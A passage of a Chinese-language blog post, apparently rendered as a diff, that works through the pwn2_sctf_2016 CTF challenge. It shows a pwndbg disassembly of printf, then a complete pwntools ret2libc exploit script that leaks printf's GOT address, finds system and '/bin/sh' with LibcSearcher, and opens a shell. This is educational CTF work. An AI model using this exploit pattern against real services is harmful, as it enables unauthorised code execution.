class="comment">//sp = sp-4</span></span><br><span class="line">   <span class="number">0xf7d09357</span> &lt;+<span class="number">23</span>&gt;:	push   edx <span class="comment">//sp = sp-4</span></span><br><span class="line">   <span class="number">0xf7d09358</span> &lt;+<span class="number">24</span>&gt;:	push   DWORD PTR [esp+<span class="number">0x18</span>]<span class="comment">//将[esp+0x18]入栈，该地址对应的是本例char[]</span></span><br><span class="line">   <span class="number">0xf7d0935c</span> &lt;+<span class="number">28</span>&gt;:	mov    eax,DWORD PTR [eax<span class="number">-0x74</span>]</span><br><span class="line">   <span class="number">0xf7d09362</span> &lt;+<span class="number">34</span>&gt;:	push   DWORD PTR [eax]</span><br><span class="line">=&gt; <span class="number">0xf7d09364</span> &lt;+<span class="number">36</span>&gt;:	call   <span class="number">0xf7d1a260</span> &lt;__vfprintf_internal&gt;</span><br><span class="line">   <span class="number">0xf7d09369</span> &lt;+<span class="number">41</span>&gt;:	add    esp,<span class="number">0x1c</span></span><br><span class="line">   <span class="number">0xf7d0936c</span> &lt;+<span class="number">44</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">       </span><br><span class="line">pwndbg&gt; disassemble <span class="string">&#x27;__x86.get_pc_thunk.ax&#x27;</span></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __x86.get_pc_thunk.ax:</span><br><span class="line">   <span class="number">0xf7dfcb0d</span> &lt;+<span class="number">0</span>&gt;:	mov    eax,DWORD PTR [esp]<span class="comment">//使用eax对esp的值进行备份，本例中存储的是RIP的值</span></span><br><span class="line">   <span class="number">0xf7dfcb10</span> &lt;+<span class="number">3</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>我们发现，printf函数并没有在栈中保存BP寄存器，并且也是从栈中获取模板字符串和参数，同时也跳过了存放RIP寄存器的内存地址。</p>
+<p>我们接着看printf函数的利用。</p>
+<p>我们的目的是用printf函数打印出他自己(也就是printf)函数的绝对地址，因此需要使用栈溢出将char[]所对应的内存修改为printf在got表中的地址，并保证能够正常进行第二次栈溢出。</p>
+<p>思来想去，可以将main函数(vuln感觉也可以，但没有尝试)的地址覆盖在BIP的所对应的内存中，这样就能进行第二次栈溢出，同时将printf的地址写在char[]的地址上保证能够输出printf的地址，栈中布局具体如下：</p>
+<p><img src="/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509224110013.png" alt="image-20210509224110013" style="zoom:67%;"></p>
+<h3 id="具体实现">具体实现</h3>
+<ol type="1">
+<li>使用负数突破输入限制：</li>
+<li>从got表中找到printf函数的绝对地址并使用LibcSearcher寻找printf在libc库中的相对地址</li>
+<li>构造栈溢，出利用printf的相对地址和绝对地址找到libc库的基址，并打印出来</li>
+<li>利用libc的基址找到system()函数以及<code>/bin/sh</code>字符串</li>
+<li>再次栈溢出执行system()函数获得shell</li>
+</ol>
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node3.buuoj.cn&#x27;,27742)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)<span class="comment">#读取elf文件</span></span><br><span class="line"><span class="built_in">print</span>(r.pid)</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]<span class="comment">#获取elf文件中plt表中printf的地址</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]<span class="comment">#获取elf文件中got表中printf的地址</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]<span class="comment">#获取elf文件中main函数的地址</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)<span class="comment">#负数溢出</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">pause()<span class="comment">#方便gdb 调试，暂停程序</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<span class="comment">#构造payload进行栈溢出，首先保证.got.plt中有printf的地址，因此尽量从plt表中访问printf函数(所以使用了p32(printf_plt))</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))<span class="comment">#上面的payload会在vuln函数结束之后跳到printf中，并输出printf的地址，由于是32位系统，则从输出数据中捕获4byte就得到了printf的绝对地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)<span class="comment">#通过函数名称和函数地址来推断使用的libc的版本</span></span><br><span class="line"><span class="comment">#寻找相应libc中的printf，system和str_bin_sh的相对地址</span></span><br><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)<span class="comment">#寻找libc的基址</span></span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)<span class="comment">#寻找system的绝对地址</span></span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)<span class="comment">#寻找/bin/sh的绝对地址</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)<span class="comment">#进行第二次栈溢出，直接调用system(/bin/sh)函数</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>在本机环境测试通过，但是在远程测试失败，还未查明原因。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/" rel="prev" title="pwn初体验">
+                  <i class="fa fa-angle-left"></i> pwn初体验
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/18/TVM%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/" rel="next" title="TVM代码阅读">
+                  TVM代码阅读 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2014 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">GXG</span>
+  </div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by10aGVtZS1uZXh0" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/comments.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/motion.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/next-boot.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/pjax.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/search/local-search.min.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.3.0/mermaid.min.js","integrity":"sha256-9y71g5Lz/KLsHjB8uXwnkuWDtAMDSzD/HdIbqhJfTAI="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/tags/mermaid.min.js"></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.3.0/wavedrom.min.js","integrity":"sha256-IRMDzTC+wK5stMucZ/XSXkeS5VNtxZ+/Bm8Mcqfoxdo="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.3.0/skins/default.js","integrity":"sha256-fduc/Zszk5ezWws2uInY/ALWVmIrmV6VTgXbsYSReFI="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/tags/wavedrom.min.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","mhchem":true,"cdn2":"https://cdn.bootcss.com/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML","cdn3":"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/math/mathjax.min.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"next-theme","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/comments/disqus.min.js"></script>
+
+</body>
+</html>
